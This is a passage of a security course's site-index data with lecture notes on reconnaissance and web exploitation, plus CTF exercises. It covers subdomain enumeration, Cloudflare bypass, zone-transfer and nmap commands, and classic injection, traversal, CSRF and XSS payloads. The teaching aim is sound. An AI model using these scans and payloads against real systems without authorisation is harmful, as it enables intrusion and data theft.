192.168.1.101\n</code></pre>"},{"location":"CS315/2021/Week%204/#netcraft","title":"Netcraft","text":"<p>Most of the info found on netcraft is not unique. It is basic whois info. But one thing is really good, it lists the different IP-addresses the page has had over the years. This can be a good way to bypass cloudflare and other services that hide the real IP. Using netcraft we can find the IP that was in use before they implemented cloudflare.</p> <p>Another detail that is good to know is the hosting-company or domain-provider. Those details can be used if we want to try some social-engineering or spear-phishing attack.</p> <p>Netcraft</p>"},{"location":"CS315/2021/Week%204/#find-subdomains","title":"Find Subdomains","text":"<p>Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success.</p> <p>For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains</p>"},{"location":"CS315/2021/Week%204/#dns-basics","title":"DNS Basics","text":"<p>This is the best article I have found about how the DNS-system works. Form the highest to the lowest level.</p> <p>An introduction to dns-terminology components and concepts</p> <p>Before we begin to look at the specific techniques that exists to find subdomains, lets try to understand what subdomains are and how they work.</p> <p>A - records</p> <p>A stands for address.</p> <p>The A record maps a name to one or more IP addresses, when the IP are known and stable. So that would be 123.244.223.222 =&gt; example.com</p> <p>AAAA - points to a IPv6 Record</p> <p>CNAME</p> <p>The CNAME record connects a name to another name. An example of that would be:</p> <pre><code>www.example.com,CNAME,www.example.com.cdn.cloudflare.net.\n</code></pre> <p>Another example is. If you have the domains mail.example.com and webmail.example.com. You can have webmail.example.com point to mail.example.com. So anyone visiting webmail.example.com will see the same thing as mail.example.com. It will NOT redirect you. Just show you the same content.</p> <p>Another typical usage of CNAME is to link www.example.com to example.com</p> <p>CNAME is quite convenient. Because if you change the A-record. The IP-address, you don't need to change the other subdomains, like ftp.example.com or www.example.com. Since they both point to example.com, which is a A-record and points directly to the IP.</p> <p>Another note. If foo.example.com points to bar.example.com, that mean that bar.example.com is the CNAME (Canonical/real/actual Name) of foo.example.com.</p> <p>Alias</p> <p>Kind of like CNAME in that it points to another name, not an IP.</p> <p>MX - Mail exchange</p> <p>https://en.wikipedia.org/wiki/MX_record</p>"},{"location":"CS315/2021/Week%204/#find-subdomains_1","title":"Find Subdomains","text":"<p>Finding subdomains is fundamental. The more subdomains you find, the bigger attack surface you have. Which means bigger possibility of success.</p> <p>For now this seems to be a very comprehensive list of tools to find subdomains. https://blog.bugcrowd.com/discovering-subdomains</p> <p>Some tools find some stuff, other tools other stuff. So your best bet is to use a few of them together. Don't forget to brute-force recursively!</p>"},{"location":"CS315/2021/Week%204/#recon-ng","title":"recon-ng","text":"<p>In order to find subdomains we can use the recon-ng framework. It has the same basic structure as metasploit. You can learn more about this tool in the tools-section.</p> <pre><code>recon-ng\n\nuse use recon/domains-hosts/\n\n# This will give you a vast amount of alternatives.\n\nshow options\n\nset source cnn.com\n</code></pre> <p>All these subdomains will be saved in <code>hosts</code>, which you can access though: <code>show hosts</code></p> <p>If some of these subdomains are not given IPs automatically you can just run</p> <pre><code>use recon/hosts-hosts/resolve\nrun\n</code></pre> <p>And it will resolve all the hosts in the hosts-file.</p>"},{"location":"CS315/2021/Week%204/#google-dorks","title":"Google Dorks","text":"<p>Using google we can also find subdomains.</p> <p>This will only give us the subdomains of a site.</p> <pre><code>site:msn.com -site:www.msn.com\nsite:*.nextcloud.com\n</code></pre> <p>To exclude a specific subdomain you can do this:</p> <pre><code>site:*.nextcloud.com -site:help.nextcloud.com\n</code></pre>"},{"location":"CS315/2021/Week%204/#subbrutepy","title":"subbrute.py","text":"<p>The basic command is like this</p> <pre><code>./subbrute.py -p cnn.com\n</code></pre> <p>https://github.com/TheRook/subbrute</p>"},{"location":"CS315/2021/Week%204/#knock","title":"Knock","text":"<p>I haven't tested this yet. https://github.com/guelfoweb/knock</p>"},{"location":"CS315/2021/Week%204/#being-smart","title":"Being smart","text":"<p>You also have to look at what kind of system the target has. Some web-apps give their clients their own subdomains. Like github.</p> <p>Check out the homepage Often companies brag about their clients. You can use this to guess the subdomains of some clients.</p>"},{"location":"CS315/2021/Week%204/#reverse-dns-lookup","title":"Reverse DNS-lookup","text":"<p>If you manage to figure out the IP range that the target owns (see section about nmap below). You can see which machines are online. And then you can run a script to find out the domain-addresses of those machines. That way you might find something new.</p> <p>The text-file onlyIps.txt is a textfile with one IP-address on each line.</p> <pre><code>#!/bin/bash\n\nwhile read p; do\n  echo $p;\n  host  $p\ndone &lt;onlyIps.txt\n</code></pre> <p>Here are some more tools that can do reverse lookup http://www.cyberciti.biz/faq/how-to-test-or-check-reverse-dns/</p>"},{"location":"CS315/2021/Week%204/#online-tools","title":"Online tools","text":""},{"location":"CS315/2021/Week%204/#dnsdumpster","title":"DNSDumpster","text":"<p>https://dnsdumpster.com/</p>"},{"location":"CS315/2021/Week%204/#pentest-tools","title":"Pentest-tools","text":"<p>https://pentest-tools.com/information-gathering/find-subdomains-of-domain</p>"},{"location":"CS315/2021/Week%204/#intodns","title":"Intodns","text":"<p>http://www.intodns.com/</p>"},{"location":"CS315/2021/Week%204/#dnsstuff","title":"DNSStuff","text":"<p>This tool doesn't enumerate subdomains per se. But it hands of a lot of information about domains. http://www.dnsstuff.com/</p>"},{"location":"CS315/2021/Week%204/#bypassing-cloudflare","title":"Bypassing CloudFlare","text":"<p>https://www.ericzhang.me/resolve-cloudflare-ip-leakage/</p> <p>This tool can be used to find old IPs. It could mean that the http://toolbar.netcraft.com/site_report?url=lyst.com</p>"},{"location":"CS315/2021/Week%204/#brute-force-dictionaries","title":"Brute force dictionaries","text":"<p>If you try to brute force the domains it is a good idea to have a good dictionary. That can be found here:</p> <p>Bitquark https://github.com/bitquark/dnspop</p> <p>SecList https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS</p>"},{"location":"CS315/2021/Week%204/#dns-zone-transfer-attack","title":"DNS Zone Transfer Attack","text":"<p>Sometimes DNS servers are misconfigured. The DNS server contains a Zone file which it uses to replicate the map of a domain. They should be configured so that only the replicating DNS-server can access it, but sometimes it is misconfigured so anyone can request the zone file, and thereby recieve the whole list of subdomains. This can be done the following way:</p> <p>To do this we first need to figure out which DNS-servers a domain has.</p> <pre><code>host -t ns wikipedia.com\nhost -l wikipedia.com ns1.wikipedia.com\n</code></pre> <p>This can also be done with tools such as dnsrecon and dnsenum.</p> <p>https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack</p>"},{"location":"CS315/2021/Week%204/#search-engine-discovery","title":"Search Engine Discovery","text":"<p>Search engines can be very useful for finding information about the target. Search engines can be used for two things:</p> <ul> <li>Finding sensitive information on the domain that you are attacking</li> <li>Finding sensitive information about the company and its employees in on other parts of the internet. Like forums, newsgroups etc.</li> </ul> <p>Remember that the world is bigger than google. So test out the other search engines.</p> <p>Baidu, binsearch.info, Bing, DuckDuckGo, ixquick/Startpage, Shodan,PunkSpider</p> <p>Google is a good tool to learn more about a website.</p>"},{"location":"CS315/2021/Week%204/#finding-specific-filetypes","title":"Finding specific filetypes","text":"<pre><code>filetype:pdf\n</code></pre>"},{"location":"CS315/2021/Week%204/#search-within-webaddress","title":"Search within webaddress","text":"<pre><code>site:example.com myword\n</code></pre>"},{"location":"CS315/2021/Week%204/#find-in-url","title":"Find in url","text":"<pre><code>inurl:test.com\n</code></pre>"},{"location":"CS315/2021/Week%204/#wild-cards","title":"Wild cards","text":"<p>You can use the asterisk to as a wildcard:</p> <pre><code>*\n</code></pre> <p>Example:</p> <pre><code>\"I've been * for a heart\"\n</code></pre> <p>This will return answers where * is anything.</p>"},{"location":"CS315/2021/Week%204/#exclude-words","title":"Exclude words","text":"<pre><code>-\n</code></pre> <p>the dash excludes a specific word</p> <p>This query searches for pages that used the word bananasplit.</p> <pre><code>-banana bananasplit\n</code></pre>"},{"location":"CS315/2021/Week%204/#cached-version","title":"Cached version","text":"<p>So if a website has been taken down you can still find the cached version, of the last time google visited the site</p> <pre><code>cache:website.com\n</code></pre> <p>https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf</p>"},{"location":"CS315/2021/Week%204/#examples","title":"Examples","text":"<p>Find login-pages on sites that use the ending .bo. For bolivia.</p> <pre><code>site:bo inurl:admin.php\n</code></pre>"},{"location":"CS315/2021/Week%204/#active-information-gathering","title":"Active information gathering","text":"<p>Once the passive phase is over it is time to move to the active phase. In this phase we start interacting with the target.</p>"},{"location":"CS315/2021/Week%204/#netdiscover","title":"Netdiscover","text":"<p>This tool is used to scan a network for live machines.</p> <pre><code>netdiscover -r 192.168.1.1/24\n</code></pre>"},{"location":"CS315/2021/Week%204/#nikto","title":"Nikto","text":"<p>Nikto is a good tool to scan webservers. It is very intrusive.</p> <pre><code>nikto -host 192.168.1.101\n</code></pre>"},{"location":"CS315/2021/Week%204/#port-scanning","title":"Port Scanning","text":""},{"location":"CS315/2021/Week%204/#tldr","title":"TLDR","text":"<pre><code># Stealthy\nnmap -sS 10.11.1.X\n\n# Scan all ports, might take a while.\nnmap 10.11.1.X -p-\n\n# Scan for UDP\nnmap 10.11.1.X -sU\nunicornscan -mU -v -I 10.11.1.X\n\n# Scan for version, with NSE-scripts and trying to identify OS\nnmap 10.11.1.X -sV -sC -O\n\n# All out monsterscan\nnmap -vvv -Pn -A -iL listOfIP.txt\n\n# Fast scan\nnmap 10.11.1.X -F\n\n# Only scan the 100 most common ports\nnmap 10.11.1.X --top-ports 100\n</code></pre>"},{"location":"CS315/2021/Week%204/#nmap","title":"Nmap","text":"<p>Now that you have gathered some IP addresses from your subdomain scanning it is time to scan those addresses. You just copy-paste those addresses and add them to a file, line by line. Then you can scan all of them with nmap at the same time. Using the <code>-iL</code> flag.</p>"},{"location":"CS315/2021/Week%204/#basics-tcp-connect-scan","title":"Basics - tcp-connect scan","text":"<p>Okay, so a bit of the basics of Nmap and how it works. When one machine initiate a connection with another machine using the transmission-control protocol (tcp) it performs what is know as a three-way handshake. That means:</p> <pre><code>machine1 sends a syn packet to machine2\nmachine2 send a syn-ack packet to machine1\nmachine1 sends a ack packet to machine2.\n</code></pre> <p>If machine2 responds with a syn-ack we know that that port is open. This is basically what nmap does when it scans for a port. If machine1 omits the last ack packet the connection is not made. This can be a way to make less noise.</p> <p>This is the default mode for nmap. If you do not add any flags and scan a machine this is the type of connection it creates.</p>"},{"location":"CS315/2021/Week%204/#stealthy-ss","title":"\"Stealthy\" -sS","text":"<p>By adding the <code>-sS</code> flag we are telling nmap to not finalize the three way handshake. It will send a <code>syn</code>, receive <code>syn-ack</code> (if the port is open), and then terminate the connection. This used to be considered stealthy before, since it was often not logged. However it should not be considered stealthy anymore.</p> <p>In the flag I imagine that the first <code>s</code> stands for scan/scantype and the second <code>S</code> stands for <code>syn</code>.</p> <p>So <code>-sS</code> can be read as scantype syn</p>"},{"location":"CS315/2021/Week%204/#udp-scan","title":"UDP scan","text":"<p>UDP is after TCP the most common protocol. DNS (53), SNMP (161/162) and DHCP (67/68) are some common ones. Scanning for it is slow and unreliable.</p> <pre><code>-sU\n</code></pre>"},{"location":"CS315/2021/Week%204/#output-scan-to-a-textfile","title":"Output scan to a textfile","text":"<p>Not all output works with grepable format. For example NSE does not work with grepable. So you might want to use xml instead.</p> <pre><code># To text-file\n-oN nameOfFile\n\n# To grepable format\n-oG nameOfFile\n\n# To xml\n-oX nameOfFile\n</code></pre>"},{"location":"CS315/2021/Week%204/#scan-an-entire-ip-range","title":"Scan an entire IP-range","text":"<p>You might find that a site has several machines on the same ip-range. You can then use nmap to scan the whole range.</p> <p>The <code>-sn</code> flag stops nmap from running port-scans. So it speeds up the process.</p> <pre><code>nmap -vvv -sn 201.210.67.0/24\n</code></pre> <p>You can also specify a specific range, like this</p> <pre><code>nmap -sP 201.210.67.0-100\n`\n</code></pre>"},{"location":"CS315/2021/Week%204/#sort-out-the-machines-that-are-up","title":"Sort out the machines that are up","text":"<p>So let's say you find that 40 machine exists in that range. We can use grep to output those IP:s.</p> <p>First let's find the IPs that were online. Ip-range is the output from previous command. You can of course combine them all.</p> <pre><code>cat ip-range.txt | grep -B 1 \"Host is up\"\n</code></pre> <p>Now let's sort out the ips from that file.</p> <pre><code>grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' ip-range.txt &gt; only-ip.txt\n</code></pre> <p>Now you can input all those ips to nmap and scan them.</p>"},{"location":"CS315/2021/Week%204/#scan-a-range-and-output-if-a-specific-port-is-open","title":"Scan a range and output if a specific port is open","text":"<p>Nmap has a command to make the output grepable.</p> <pre><code>nmap -vvv -p 80 201.210.67.0-100 -oG - | grep 80/open\n</code></pre>"},{"location":"CS315/2021/Week%204/#nmap-scripts","title":"Nmap scripts","text":"<p>This chapter could also be placed in Vulnerability-analysis and Exploitation. Because nmap scripting is a really versatile tool that can do many things. Here we will focus on it's ability to retrieve information that can be useful in the process to find vulnerabilities</p> <p>First locate the nmap scripts. Nmap scripts end in <code>.nse</code>. For Nmap script engine.</p> <pre><code>locate *.nse\n</code></pre> <p>The syntax for running a script is:</p> <pre><code>nmap --script scriptname 192.168.1.101\n</code></pre> <p>To find the \"man\"-pages, the info about a script we write:</p> <pre><code>nmap -script-help http-vuln-cve2013-0156.nse\n</code></pre> <p>Run multiple scripts</p> <p>Can be run by separating the script with a comma</p> <pre><code>nmap --script scriptone.nse,sciprt2.nse,script3.nse 192.168.1.101\n</code></pre> <p>Run the default scripts</p> <pre><code>nmap -sC example.com\n</code></pre>"},{"location":"CS315/2021/Week%204/#metasploit","title":"Metasploit","text":"<p>We can do port-scanning with metasploit and nmap. And we can even integrate nmap into metasploit. This might be a good way to keep your process neat and organized.</p>"},{"location":"CS315/2021/Week%204/#db_nmap","title":"db_nmap","text":"<p>You can run <code>db_nmap</code> and all the output will be stored in the metasploit database and available with</p> <pre><code>hosts\nservices\n</code></pre> <p>You can also import nmap scans. But you must first output it in xml-format with the following flag</p> <pre><code>nmap 192.168.1.107 -oX result.xml\n</code></pre> <p>Good practice would be to output the scan-results in xml, grepable and normal format. You do that with</p> <pre><code>nmap 192.168.1.107 -oA result\n</code></pre> <p>Then you can load it into the database with the following command.</p> <pre><code>db_import /path/to/file.xml\n</code></pre>"},{"location":"CS315/2021/Week%204/#metasploit-portscan-modules","title":"Metasploit PortScan modules","text":"<p>If you for some reason don't have access to nmap you can run metasploits modules that does portscans</p> <pre><code>use auxiliary/scanner/portscan/\n</code></pre>"},{"location":"CS315/2021/Week%204/#stealing-sensitive-information-disclosure-from-a-web","title":"Stealing Sensitive Information Disclosure from a Web","text":"<p>If at some point you find a web page that presents you sensitive information based on your session: Maybe it's reflecting cookies, or printing or CC details or any other sensitive information, you may try to steal it. Here I present you the main ways to can try to achieve it:</p> <ul> <li>CORS bypass: If you can bypass CORS headers you will be able to steal the information performing Ajax request for a malicious page.</li> <li>XSS: If you find a XSS vulnerability on the page you may be able to abuse it to steal the information.</li> <li>Danging Markup: If you cannot inject XSS tags you still may be able to steal the info using other regular HTML tags.</li> <li>Clickjaking: If there is no  protection against this attack, you may be able to trick the user into sending you the sensitive data (an example here).</li> </ul>"},{"location":"CS315/2021/Week%204/#exercise","title":"Exercise","text":"<p>This week we won't have CTF grades. But you still can have a try.</p>"},{"location":"CS315/2021/Week%204/#0-pt-kitten-war-behind-the-domain","title":"(0 pt) Kitten War: Behind the Domain","text":"<p>Each year, those dragon-li cats would have a war with orange cats. From dining hall to library, from Lychee Hill to TB2. All day to night they fought together to claim manor.</p> <p>However, this year things are different. Since the COVID-19 becomes serious and dangerous, which can also infect cats. Kitten war would be hold online.</p> <p>Now, dragon-li cats just borrowed ours domain name to establish their website. Once the website is finished, they would hire too many cats that orange cats can't fight.</p> <p>One day, when you step into TB2, an orange cat stopped you and begged, \"humble human, please help us! We are losing the war.\"</p> <p></p> <p>\"Find out what are those dragon-li cats hiding. If you can retrieve the flag behind the domain, I would allow you to pat my belly - for 2 seconds!\"</p> <p>Kittens are so lovely, you can't resist and start to discover DNS records...</p> <p><code>compass.college</code></p> <p>Hint1: cats like TXT because TXT looks so cute!</p> <p>Hint2: cats only know a few words listed in the file below.</p> <p>wordlist.txt</p>"},{"location":"CS315/2021/Week%204/#0-pt-kitten-war-5-cats-in-a-row","title":"(0 pt) Kitten War: 5 Cats in a Row","text":"<p>Two dragon-li cats are staring at you for a while, since the last cyber attack. After you step into the classroom in TB1, a dragon-li cat jumped on the desk and starts talking to you.</p> <p></p> <p>\"Orange cats are greedy. Team with us dragon-li cats.\" That cat licks its claw, said, \"TB1 is ours manor, if you team with us, you can always pat cats in TB1.\"</p> <p>\"Now, here's your mission. Orange cats are using a website built by a CTFer from COMPASS. That guy is a noob and the website must be full of vulnerabilities. Check the sensitive files on the website and find us some flag.\"</p> <p>\"If we make orange cats have the website. They would be allowed to purchase dangerous weapons from online market. Then we won't defeat them in video games!\"</p> <p>Without a hesitate, you start to hack the website:</p> <p>Very cheap and nice weapons for orange cats :P)</p>"},{"location":"CS315/2021/Week%204/#bonus-0-pt-kitten-war-black-means-blind","title":"(BONUS 0 pt) Kitten War: Black means Blind","text":"<p>The war has lasted for 2 months.</p> <p>The dragon-li cats are settling in TB1 and dining hall, while the orange cats are claimed Lychee Hill and TB2.</p> <p>A black cat was so struggle with these fights. The cat, said, \"we, we are cats. We slept 20 hours a day. Why do we bother fighting instead of sleeping?\"</p> <p></p> <p>\"Now you have a choice to stop the war,\" the black cat said, \"everyone are looking at obvious things, but nobody cares about blind night.\"</p> <p>\"Log in COMPASS admin panel and use the final flag to stop the meaningless war.\"</p> <p>COMPASS Admin Note</p> <p>app.py</p>"},{"location":"CS315/2021/Week%205/","title":"Week5 WEB: Vulnerability Exploit","text":"<p>According to the @CTF101: https://ctf101.org/</p>"},{"location":"CS315/2021/Week%205/#web-exploitation","title":"Web Exploitation","text":"<p>Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming language that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework.</p> <p>These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privilege.</p> <p>Common vulnerabilities to see in CTF challenges:</p> <ul> <li>SQL Injection</li> <li>Command Injection</li> <li>Directory Traversal</li> <li>Cross Site Request Forgery</li> <li>Cross Site Scripting</li> <li>Server Side Request Forgery</li> </ul>"},{"location":"CS315/2021/Week%205/#sql-injection","title":"SQL Injection","text":"<p>SQL Injection is a vulnerability where an application takes input from a user and doesn't validate that the user's input doesn't contain additional SQL.</p> <pre><code>&lt;?php\n    $username = $_GET['username']; // kchung\n    $result = mysql_query(\"SELECT * FROM users WHERE username='$username'\");\n?&gt;\n</code></pre> <p>If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).</p> <p>But a malicious user might submit different kind of data. For example, consider if the input was <code>'</code>?</p> <p>The application would crash because the resulting SQL query is incorrect.</p> <pre><code>SELECT * FROM users WHERE username='''\n</code></pre> <p>Notice the extra single quote at the end.</p> <p>With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.</p> <p>What if our input was <code>' OR 1=1</code>?</p> <pre><code>SELECT * FROM users WHERE username='' OR 1=1\n</code></pre> <p>1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying</p> <pre><code>SELECT * FROM users WHERE username='' OR true\n</code></pre> <p>This will return every row in the table because each row that exists must be true.</p> <p>We can also inject comments and termination characters like <code>--</code> or <code>/*</code> or <code>;</code>. This allows you to terminate SQL queries after your injected statements. For example <code>'--</code> is a common SQL injection payload.</p> <pre><code>SELECT * FROM users WHERE username=''-- '\n</code></pre> <p>This payload sets the username parameter to an empty string to break out of the query and then adds a comment (<code>--</code>) that effectively hides the second single quote.</p> <p>Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.</p>"},{"location":"CS315/2021/Week%205/#command-injection","title":"Command Injection","text":"<p>Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the <code>system()</code> command or its equivalent in the programming language of the application.</p> <pre><code>import os\n\ndomain = user_input() # ctf101.org\n\nos.system('ping ' + domain)\n</code></pre> <p>The above code when used normally will ping the <code>ctf101.org</code> domain.</p> <p>But consider what would happen if the <code>user_input()</code> function returned different data?</p> <pre><code>import os\n\ndomain = user_input() # ; ls\n\nos.system('ping ' + domain)\n</code></pre> <p>Because of the additional semicolon, the <code>os.system()</code> function is instructed to run two commands.</p> <p>It looks to the program as:</p> <pre><code>ping ; ls\n</code></pre> <p>The semicolon terminates a command in bash and allows you to put another command after it.</p> <p>Because the <code>ping</code> command is being terminated and the <code>ls</code> command is being added on, the <code>ls</code> command will be run in addition to the empty ping command!</p> <p>This is the core concept behind command injection. The <code>ls</code> command could of course be switched with another command (e.g. wget, curl, bash, etc.)</p> <p>Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.</p>"},{"location":"CS315/2021/Week%205/#example-payloads","title":"Example Payloads","text":"<ul> <li><code>;ls</code></li> <li><code>$(ls)</code></li> <li><code>ls</code></li> </ul>"},{"location":"CS315/2021/Week%205/#directory-traversal","title":"Directory Traversal","text":"<p>Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path.</p> <p>Any kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal.</p> <p>For example, consider an application that allows the user to choose what page to load from a GET parameter.</p> <pre><code>&lt;?php\n    $page = $_GET['page']; // index.php\n    include(\"/var/www/html/\" . $page);\n?&gt;\n</code></pre> <p>Under normal operation the page would be <code>index.php</code>. But what if a malicious user gave in something different?</p> <pre><code>&lt;?php\n    $page = $_GET['page']; // ../../../../../../../../etc/passwd\n    include(\"/var/www/html/\" . $page);\n?&gt;\n</code></pre> <p>Here the user is submitting <code>../../../../../../../../etc/passwd</code>.</p> <p>This will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder.</p> <pre><code>include(\"/var/www/html/../../../../../../../../etc/passwd\");\n</code></pre> <p>Ultimately this will become <code>/etc/passwd</code> because the computer will not go a directory above its top directory.</p> <p>Thus the application will load the <code>/etc/passwd</code> file and emit it to the user like so:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n_apt:x:104:65534::/nonexistent:/bin/false\n</code></pre> <p>This same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities.</p>"},{"location":"CS315/2021/Week%205/#cross-site-request-forgery-csrf","title":"Cross Site Request Forgery (CSRF)","text":"<p>A Cross Site Request Forgery or CSRF Attack, pronounced see surf, is an attack on an authenticated user which uses a state session in order to perform state changing attacks like a purchase, a transfer of funds, or a change of email address.</p> <p>The entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through an <code>&lt;img&gt;</code> tag or an <code>&lt;iframe&gt;</code> where references to external resources are unverified.</p>"},{"location":"CS315/2021/Week%205/#using-csrf","title":"Using CSRF","text":"<p><code>GET</code> requests are often used by websites to get user input. Say a user signs in to an banking site which assigns their browser a cookie which keeps them logged in. If they transfer some money, the URL that is sent to the server might have the pattern:</p> <pre><code>http://securibank.com/transfer.do?acct=[RECEPIENT]&amp;amount=[DOLLARS]\n</code></pre> <p>Knowing this format, an attacker can send an email with a hyperlink to be clicked on or they can include an image tag of 0 by 0 pixels which will automatically be requested by the browser such as:</p> <pre><code>&lt;img src=\"http://securibank.com/transfer.do?acct=[RECEPIENT]&amp;amount=[DOLLARS]\" width=\"0\" height=\"0\" border=\"0\"&gt;\n</code></pre>"},{"location":"CS315/2021/Week%205/#cross-site-scripting-xss","title":"Cross Site Scripting (XSS)","text":"<p>Cross Site Scripting or XSS is a vulnerability where on user of an application can send JavaScript that is executed by the browser of another user of the same application.</p> <p>This is a vulnerability because JavaScript has a high degree of control over a user's web browser.</p> <p>For example JavaScript has the ability to:</p> <ul> <li>Modify the page (called the DOM)</li> <li>Send more HTTP requests</li> <li>Access cookies</li> </ul> <p>By combining all of these abilities, XSS can maliciously use JavaScript to extract user's cookies and send them to an attacker controlled server. XSS can also modify the DOM to phish users for their passwords. This only scratches the surface of what XSS can be used to do.</p> <p>XSS is typically broken down into three categories:</p> <ul> <li>Reflected XSS</li> <li>Stored XSS</li> <li>DOM XSS</li> </ul>"},{"location":"CS315/2021/Week%205/#reflected-xss","title":"Reflected XSS","text":"<p>Reflected XSS is when an XSS exploit is provided through a URL paramater.</p> <p>For example:</p> <pre><code>https://ctf101.org?data=&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>You can see the XSS exploit provided in the <code>data</code> GET parameter. If the application is vulnerable to reflected XSS, the application will take this data parameter value and inject it into the DOM.</p> <p>For example:</p> <pre><code>&lt;html&gt;\n    &lt;body&gt;\n        &lt;script&gt;alert(1)&lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Depending on where the exploit gets injected, it may need to be constructed differently.</p> <p>Also, the exploit payload can change to fit whatever the attacker needs it to do. Whether that is to extract cookies and submit it to an external server, or to simply modify the page to deface it.</p> <p>One of the deficiencies of reflected XSS however is that it requires the victim to access the vulnerable page from an attacker controlled resource. Notice that if the data paramter, wasn't provided the exploit wouldn't work.</p> <p>In many situations, reflected XSS is detected by the browser because it is very simple for a browser to detect malicous XSS payloads in URLs.</p>"},{"location":"CS315/2021/Week%205/#stored-xss","title":"Stored XSS","text":"<p>Stored XSS is different from reflected XSS in one key way. In reflected XSS, the exploit is provided through a GET parameter. But in stored XSS, the exploit is provided from the website itself.</p> <p>Imagine a website that allows users to post comments. If a user can submit an XSS payload as a comment, and then have others view that malicious comment, it would be an example of stored XSS.</p> <p>The reason being that the web site itself is serving up the XSS payload to other users. This makes it very difficult to detect from the browser's perspective and no browser is capable of generically preventing stored XSS from exploiting a user.</p>"},{"location":"CS315/2021/Week%205/#dom-xss","title":"DOM XSS","text":"<p>DOM XSS is XSS that is due to the browser itself injecting an XSS payload into the DOM. While the server itself may properly prevent XSS, it's possible that the client side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger.</p> <p>The server itself is not to blame, but the client side JavaScript files are causing the issue.</p>"},{"location":"CS315/2021/Week%205/#server-side-request-forgery-ssrf","title":"Server Side Request Forgery (SSRF)","text":"<p>Server Side Request Forgery or SSRF is where an attacker is able to cause a web application to send a request that the attacker defines.</p> <p>For example, say there is a website that lets you take a screenshot of any site on the internet.</p> <p>Under normal usage a user might ask it to take a screenshot of a page like Google, or The New York Times. But what if a user does something more nefarious? What if they asked the site to take a picture of http://localhost ? Or perhaps tries to access something more useful like http://localhost/server-status ?</p> <p>127.0.0.1 (also known as localhost or loopback) represents the computer itself. Accessing localhost means you are accessing the computer's own internal network. Developers often use localhost as a way to access the services they have running on their own computers.</p> <p>Depending on what the response from the site is the attacker may be able to gain additional information about what's running on the computer itself.</p> <p>In addition, the requests originating from the server would come from the server's IP not the attackers IP. Because of that, it is possible that the attacker might be able to access internal resources that he wouldn't normally be able to access.</p> <p>Another usage for SSRF is to create a simple port scanner to scan the internal network looking for internal services.</p>"},{"location":"CS315/2021/Week%205/#php","title":"PHP","text":"<p>PHP is one of the most used languages for back-end web development and therefore it has become a target by hackers. PHP is a language which makes it painful to be secure for most instances, making it every hacker's dream target.</p>"},{"location":"CS315/2021/Week%205/#overview","title":"Overview","text":"<p>PHP is a C-like language which uses tags enclosed by <code>&lt;?php ... ?&gt;</code> (sometimes just <code>&lt;? ... ?&gt;</code>). It is inlined into HTML. A word of advice is to keep the php docs open because function names are strange due to the fact that the length of function name is used to be the key in PHP's internal dictionary, so function names were shortened/lengthened to make the lookup faster. Other things include:</p> <ul> <li>Variables start with $: <code>$name</code></li> <li>Variable variables: <code>$$name</code></li> <li>Request-specific dictionaries: <code>$_GET, $_POST, $_SERVER</code></li> </ul>"},{"location":"CS315/2021/Week%205/#example","title":"Example","text":"<pre><code>&lt;?php\n    if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; isset($_POST['email']) &amp;&amp; isset($_POST['password'])) {\n        $db = new mysqli('127.0.0.1', 'cs3284', 'cs3284', 'logmein');\n        $email = $_POST['email'];\n        $password = sha1($_POST['password']);\n        $res = $db-&gt;query(\"SELECT * FROM users WHERE email = 